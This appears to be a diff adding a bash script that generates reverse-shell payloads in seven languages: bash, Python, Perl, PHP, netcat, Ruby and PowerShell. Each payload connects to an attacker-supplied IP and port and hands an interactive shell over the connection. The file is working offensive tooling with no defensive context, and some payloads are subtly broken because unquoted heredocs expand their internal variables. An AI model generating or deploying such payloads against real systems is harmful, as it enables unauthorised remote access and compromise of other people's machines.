@@ -1,0 +1,86 @@
+#!/bin/bash
+
+# Function to generate a reverse shell payload
+generate_reverse_shell() {
+    local shell=$1
+    local ip=$2
+    local port=$3
+
+    case $shell in
+        bash)
+            cat <<EOF
+#!/bin/bash
+bash -i >& /dev/tcp/$ip/$port 0>&1
+EOF
+            ;;
+        python)
+            cat <<EOF
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+EOF
+            ;;
+        perl)
+            cat <<EOF
+perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+EOF
+            ;;
+        php)
+            cat <<EOF
+<?php
+\$ip = "$ip";
+\$port = $port;
+\$sock = fsockopen(\$ip, \$port);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+EOF
+            ;;
+        netcat)
+            cat <<EOF
+nc -e /bin/sh $ip $port
+EOF
+            ;;
+        ruby)
+            cat <<EOF
+require 'socket'
+s = TCPSocket.open("$ip", $port)
+while (cmd = s.gets); do
+  IO.popen(cmd, 'r') do |io|
+    s.puts io.read
+  end
+end
+EOF
+            ;;
+        powershell)
+            cat <<EOF
+$client = New-Object System.Net.Sockets.TCPClient("$ip", $port);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535 | % {0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+EOF
+            ;;
+        *)
+            echo "Unsupported shell: $shell"
+            exit 1
+            ;;
+    esac
+}
+
+# Main script
+if [ $# -ne 3 ]; then
+    echo "Usage: $0 <shell> <ip> <port>"
+    echo "Supported shells: bash, python, perl, php, netcat, ruby, powershell"
+    exit 1
+fi
+
+shell=$1
+ip=$2
+port=$3
+
+generate_reverse_shell $shell $ip $port
